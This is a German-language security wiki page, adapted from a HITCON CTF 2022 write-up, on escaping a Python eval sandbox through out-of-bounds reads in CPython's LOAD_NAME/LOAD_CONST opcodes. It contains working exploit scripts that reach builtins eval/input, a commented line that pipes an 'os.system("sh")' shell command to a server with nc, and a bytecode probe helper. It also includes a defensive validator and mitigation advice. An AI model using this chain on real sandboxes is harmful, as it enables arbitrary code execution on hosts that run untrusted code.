# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**Diese Information wurde übernommen** [**aus diesem Writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Wir können die OOB-read-Funktion im LOAD_NAME- / LOAD_CONST-opcode verwenden, um ein Symbol aus dem Speicher zu erhalten. Das bedeutet, dass wir einen Trick wie `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` verwenden können, um ein gewünschtes Symbol (z. B. einen Funktionsnamen) zu erhalten.

Danach muss nur noch der exploit erstellt werden.

### Übersicht <a href="#overview-1" id="overview-1"></a>

Der Quellcode ist ziemlich kurz und enthält nur 4 Zeilen!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Du kannst beliebigen Python-Code eingeben, der zu einem [Python code object](https://docs.python.org/3/c-api/code.html) kompiliert wird. Allerdings werden `co_consts` und `co_names` dieses code object vor der Ausführung mit `eval` durch ein leeres Tupel ersetzt.

Daher können alle Ausdrücke, die consts (z. B. Zahlen, Strings usw.) oder names (z. B. Variablen, Funktionen) enthalten, letztendlich einen segmentation fault verursachen.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Wie kommt es zum segmentation fault?

Beginnen wir mit einem einfachen Beispiel: `[a, b, c]` könnte in den folgenden Bytecode kompiliert werden.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Aber was passiert, wenn `co_names` zu einem leeren Tupel wird? Der Opcode `LOAD_NAME 2` wird trotzdem ausgeführt und versucht, den Wert von der Speicheradresse zu lesen, an der er sich ursprünglich befinden sollte. Ja, dies ist ein Out-of-Bounds-Read-"Feature".

Das grundlegende Konzept für die Lösung ist einfach. Einige Opcodes in CPython, zum Beispiel `LOAD_NAME` und `LOAD_CONST`, sind für OOB-Reads anfällig (?).

Sie rufen ein Objekt am Index `oparg` aus dem `consts`- oder `names`-Tupel ab (so werden `co_consts` und `co_names` intern bezeichnet). Anhand des folgenden kurzen Snippets zu `LOAD_CONST` können wir sehen, was CPython bei der Verarbeitung des Opcodes `LOAD_CONST` macht.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Auf diese Weise können wir das OOB-Feature verwenden, um einen „name“ von einem beliebigen Speicher-Offset abzurufen. Um sicherzustellen, welchen Namen er hat und welcher Offset verwendet wird, versuchen Sie einfach weiterhin `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... auszuführen. Dabei könnten Sie etwas bei einem oparg > 700 finden. Sie können natürlich auch versuchen, gdb zu verwenden, um sich das Speicherlayout anzusehen, aber ich glaube nicht, dass dies einfacher wäre?

### Exploit generieren <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Sobald wir diese nützlichen Offsets für names / consts abgerufen haben, wie _bekommen_ wir einen name / const von diesem Offset und verwenden ihn? Hier ist ein Trick für Sie:\
Nehmen wir an, wir können einen `__getattribute__`-Namen von Offset 5 (`LOAD_NAME 5`) mit `co_names=()` abrufen. Dann führen wir einfach Folgendes aus:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Beachte, dass es nicht notwendig ist, es `__getattribute__` zu nennen; du kannst es auch kürzer oder ungewöhnlicher benennen.

Du kannst den Grund allein durch die Betrachtung des Bytecodes verstehen:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Beachte, dass `LOAD_ATTR` den Namen ebenfalls aus `co_names` abruft. Python lädt Namen vom selben Offset, wenn der Name identisch ist, daher wird das zweite `__getattribute__` weiterhin von offset=5 geladen. Mit diesem Feature können wir beliebige Namen verwenden, sobald sich der Name im nahegelegenen Speicher befindet.

Das Generieren von Zahlen sollte trivial sein:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

Ich habe aufgrund des Längenlimits keine consts verwendet.

Zuerst kommt ein Script, mit dem wir diese Offsets von Namen ermitteln können.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Und das Folgende dient zur Erstellung des tatsächlichen Python-Exploits.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Im Wesentlichen führt es für die Strings, die wir aus der `__dir__`-Methode erhalten, Folgendes aus:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Versionshinweise und betroffene Opcodes (Python 3.11–3.13)

- CPython-Bytecode greift weiterhin über ganzzahlige Operanden auf die Tupel `co_consts` und `co_names` zu. Wenn ein Angreifer erzwingen kann, dass diese Tupel leer sind (oder kleiner als der vom Bytecode verwendete maximale Index), liest der Interpreter für diesen Index Speicher außerhalb des gültigen Bereichs und erhält dadurch einen beliebigen PyObject-Zeiger aus dem nahegelegenen Speicher. Zu den relevanten Opcodes gehören mindestens:
- `LOAD_CONST consti` → liest `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → lesen Namen aus `co_names[...]` (bei 3.11+ speichern `LOAD_ATTR`/`LOAD_GLOBAL` Flag-Bits im niederwertigsten Bit; der tatsächliche Index ist `namei >> 1`). Siehe die Disassembler-Dokumentation für die genaue Semantik je nach Version. [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ führte adaptive/inline caches ein, die versteckte `CACHE`-Einträge zwischen den Instruktionen hinzufügen. Dies ändert nichts an der OOB-Primitiv; es bedeutet lediglich, dass du beim manuellen Erstellen von Bytecode diese Cache-Einträge beim Aufbau von `co_code` berücksichtigen musst.

Praktische Auswirkung: Die Technik auf dieser Seite funktioniert weiterhin unter CPython 3.11, 3.12 und 3.13, wenn du ein Code-Objekt kontrollieren (z. B. über `CodeType.replace(...)`) und `co_consts`/`co_names` verkleinern kannst.

### Schneller Scanner für nützliche OOB-Indizes (kompatibel mit 3.11+/3.12+)

Wenn du interessante Objekte lieber direkt aus dem Bytecode statt aus High-Level-Quellcode untersuchen möchtest, kannst du minimale Code-Objekte erzeugen und Indizes per Brute Force durchprobieren. Der folgende Helfer fügt bei Bedarf automatisch Inline-Caches ein.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Hinweise
- Um stattdessen Namen zu prüfen, ersetze `LOAD_CONST` durch `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` und passe die Stack-Nutzung entsprechend an.
- Verwende bei Bedarf `EXTENDED_ARG` oder mehrere Bytes von `arg`, um Indizes >255 zu erreichen. Beim Erstellen mit `dis` wie oben kontrollierst du nur das niedrige Byte; für größere Indizes musst du die rohen Bytes selbst erstellen oder den Angriff auf mehrere Loads aufteilen.

### Minimales bytecode-only-RCE-Muster (co_consts OOB → builtins → eval/input)

Sobald du einen `co_consts`-Index identifiziert hast, der zum builtins-Modul aufgelöst wird, kannst du `eval(input())` ohne `co_names` rekonstruieren, indem du den Stack manipulierst:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Dieser Ansatz ist bei Challenges nützlich, die dir direkte Kontrolle über `co_code` geben und gleichzeitig `co_consts=()` sowie `co_names=()` erzwingen (z. B. BCTF 2024 „awpcode“). Er vermeidet Tricks auf Source-Ebene und hält die Payload-Größe klein, indem er Bytecode-Stack-Operationen und Tuple-Builder nutzt.

### Defensive Prüfungen und Mitigations für Sandboxes

Wenn du eine Python-„Sandbox“ schreibst, die nicht vertrauenswürdigen Code kompiliert/auswertet oder Code-Objekte manipuliert, solltest du dich nicht darauf verlassen, dass CPython die Grenzen von Tuple-Indizes prüft, die vom Bytecode verwendet werden. Validiere stattdessen Code-Objekte selbst, bevor du sie ausführst.

Praktischer Validator (weist OOB-Zugriffe auf co_consts/co_names zurück)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Zusätzliche Maßnahmen zur Risikominderung
- Erlaube kein beliebiges `CodeType.replace(...)` mit nicht vertrauenswürdigen Eingaben oder füge strenge strukturelle Prüfungen für das resultierende Code-Objekt hinzu.
- Erwäge, nicht vertrauenswürdigen Code in einem separaten Prozess mit OS-level sandboxing (seccomp, job objects, Containern) auszuführen, anstatt dich auf die CPython-Semantik zu verlassen.

## Referenzen

- [1] [Splitlines HITCON CTF 2022 Writeup "V O I D" (Ursprung dieser Technik und der Exploit-Kette auf hoher Ebene)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Dokumentation des Python-Disassemblers (Semantik der Indizes für LOAD_CONST/LOAD_NAME/usw. sowie die Low-Bit-Flags von `LOAD_ATTR`/`LOAD_GLOBAL` in 3.11+)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
